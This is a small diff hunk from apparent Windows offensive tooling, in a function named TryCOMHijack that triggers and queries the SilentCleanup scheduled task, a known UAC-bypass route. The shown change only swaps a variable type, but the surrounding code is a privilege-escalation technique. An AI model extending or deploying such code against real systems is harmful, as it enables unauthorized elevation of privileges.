@@ -564,7 +564,7 @@ bool TryCOMHijack(const char* myExePathA) {
         INFO("Triggering SilentCleanup task...");
         // Check task XML for command line (diagnostic)
         {
-            HANDLE ph = nullptr;
+            FILE* ph = nullptr;
             char scCmd[] =
                 "schtasks /query /tn "
                 "\"\\Microsoft\\Windows\\DiskCleanup\\SilentCleanup\" /xml";
